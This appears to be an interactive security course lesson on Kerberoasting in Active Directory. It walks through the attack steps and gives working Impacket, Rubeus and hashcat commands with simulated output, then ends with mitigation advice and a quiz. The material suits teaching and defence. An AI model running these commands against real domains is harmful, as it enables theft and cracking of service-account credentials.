
# Active Directory Attacks: Kerberoasting

## The Silver Bullet of AD
95% of Fortune 500 companies use Active Directory (AD). If you can hack AD, you own the company.
**Kerberoasting** is a technique that allows any valid domain user to request a password hash for any service account in the domain.

## 1. Understanding Kerberos (Simplified)
Kerberos relies on tickets.
1.  **TGT (Ticket Granting Ticket):** Proof you are who you say you are.
2.  **TGS (Ticket Granting Service):** A ticket to access a specific service (like SQL or IIS).

<Mermaid chart={`
sequenceDiagram
    participant User
    participant KDC as Domain Controller (KDC)
    participant Service as SQL Server

    User->>KDC: I want to talk to SQL Server (Request TGS)
    Note over KDC: KDC checks if User has a valid TGT...
    KDC->>User: Here is your TGS (Encrypted with SQL Service Password)
    User->>Service: Here is my TGS
    Service->>User: Access Granted!
`} />

**The Flaw:** The KDC gives the User the TGS *encrypted with the Service Account's password*. The User can take this ticket offline and try to brute-force crack it.

## 2. The Attack Steps
1.  **Enumerate SPNs:** Find all user accounts that are running services (Service Principal Names).
2.  **Request TGS:** Ask the Domain Controller for a ticket for that service. (No special privileges needed!).
3.  **Dump Hash:** Export the ticket to a format like `.kirbi` or Hashcat format.
4.  **Crack Offline:** Use Hashcat to guess the password.

## 3. Tools of the Trade
We typically use `Rubeus` (Windows) or `Impacket` (Linux).

### Linux: Impacket-GetUserSPNs
<TerminalSimulator 
    cmd="GetUserSPNs.py corp.local/john:Password123 -request" 
    output={`Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf  PasswordLastSet  LastLogon
--------------------  -------------  --------  ---------------  ---------
MSSQLSvc/sql01:1433   svc_sql        CN=User   2025-01-01      2025-05-15

$krb5tgs$23$*svc_sql$corp.local$MSSQLSvc/sql01:1433*$A4F8... (Hash)
`} 
/>

### Windows: Rubeus
`.\Rubeus.exe kerberoast /outfile:hashes.txt`

## 4. Cracking the Hash
Once you have the hash, you don't need to touch the DC anymore. You can use your rig with 4x RTX 4090s.

**Hashcat Mode:** 13100 (Type 23 TGS-REP)

<TerminalSimulator 
    cmd="hashcat -m 13100 -a 0 hashes.txt rockyou.txt" 
    output={`$krb5tgs$23$*svc_sql...:Summer2025!

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5, etype 23, TGS-REP
Input.Mode.......: Dict (rockyou.txt)
`} 
/>

## Remediation
You cannot "patch" Kerberoasting; it is how Kerberos works. You can only mitigate it:
1.  **Strong Passwords:** Service accounts should have 25+ character random passwords that cannot be bruted.
2.  **Monitoring:** Alert on "Encryption Downgrade" requests or excessive TGS requests from a single user (Honeytoken).

---

<Quiz 
    question="Why is Kerberoasting considered a 'Post-Exploitation' attack?" 
    options={[
        "Because you need to exploit a kernel vulnerability first",
        "Because you need at least one valid Domain User account or a foothold to perform it",
        "Because it only works after the Domain Controller is crashed",
        "Because it requires Domain Admin privileges"
    ]} 
    answer="Because you need at least one valid Domain User account or a foothold to perform it" 
/>
